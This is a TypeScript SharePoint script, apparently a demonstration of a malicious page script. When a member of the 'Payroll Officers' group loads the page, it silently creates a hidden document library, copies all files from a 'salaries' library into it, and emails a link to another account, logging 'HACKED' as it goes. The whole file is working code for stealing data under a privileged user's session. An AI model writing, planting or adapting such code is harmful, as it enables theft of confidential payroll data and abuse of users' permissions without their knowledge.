declare var _spPageContextInfo;

import * as $pnp from 'sp-pnp-js';

const hack = () => {
	console.log('START HACKING');
	let tmpListName = 'TMP_' + +new Date();
	let targetFolder = null;
	let foldersMapping = [];
	// Create another library
	$pnp.sp.web.lists
		.add(tmpListName, '', 101, false, {
			Hidden: true
		})
		.then((listCreated) =>
			$pnp.sp.web.lists
				.getById(listCreated.data.Id)
				.rootFolder.get()
				.then((rootFolder) => {
					targetFolder = rootFolder;
				})
				.then(() =>
					// Get the folders from the salaries library
					$pnp.sp.web
						.getFolderByServerRelativeUrl('/sites/aos_classic/salaries')
						.folders.filter("Name ne 'Forms'")
						.get()
						.then((folders: any[]) => {
							let folderCreationPromises = [];
							folders.forEach((folder) => {
								let url = folder.ServerRelativeUrl;

								console.log(`Copying content of ${folder.ServerRelativeUrl}`);
								let folderWeb = new $pnp.Web(_spPageContextInfo.webAbsoluteUrl);
								folderCreationPromises.push(
									folderWeb
										.getFolderByServerRelativeUrl(targetFolder.ServerRelativeUrl)
										.folders.add(folder.Name)
										.then((newTargetFolder) => {
											let newMapping = {
												source: url,
												target: targetFolder.ServerRelativeUrl + '/' + folder.Name
											};
											console.log(newMapping);
											foldersMapping.push(newMapping);
										})
								);
							});
							return Promise.all(folderCreationPromises);
							// Once all folders are created
						})
						.then(() => {
							let filesFetchPromises = [];
							// Get all the files to copy
							foldersMapping.forEach((fm) => {
								filesFetchPromises.push(
									$pnp.sp.web
										.getFolderByServerRelativeUrl(fm.source)
										.files.get()
										.then((files: any[]) => {
											fm.files = files;
										})
								);
							});

							return Promise.all(filesFetchPromises);
						})
						.then(() => {
							let filesCopyPromises = [];
							foldersMapping.forEach((fm) => {
								console.log(fm.files);
								fm.files.forEach((file) => {
									let newUrl = fm.target + '/' + file.Name;
									console.log(`Copying ${file.ServerRelativeUrl} to ${newUrl}`);
									let fileWeb = new $pnp.Web(_spPageContextInfo.webAbsoluteUrl);
									filesCopyPromises.push(
										fileWeb
											.getFileByServerRelativeUrl(file.ServerRelativeUrl)
											.copyTo(newUrl)
											.then(() => {
												console.log('Copy done! HACKED !!!!');
											})
											.catch(() => {
												console.log('CANNOT BE HACKED !');
											})
									);
								});
							});
							return Promise.all(filesCopyPromises);
						})
						.then(() => {
							const emailProps = {
								To: [ 'bob.designer@ike365.onmicrosoft.com' ],
								CC: [],
								Subject: 'Notification' + targetFolder.Name,
								Body:
									"<a href='https://ike365.sharepoint.com/" +
									targetFolder.ServerRelativeUrl +
									"'>CHECK THE DOCUMENTS</a>"
							};
							$pnp.sp.utility.sendEmail(emailProps);
						})
				)
		);
};

// Check the current user is in the right group
$pnp.sp.web.currentUser
	.expand('Groups')
	.select('Id', 'Groups/Title')
	.get()
	.then((result) => {
		return result.Groups && result.Groups.filter((g) => g.Title == 'Payroll Officers').length == 1;
	})
	.then((res) => {
		if (res) {
			hack();
		}
	});
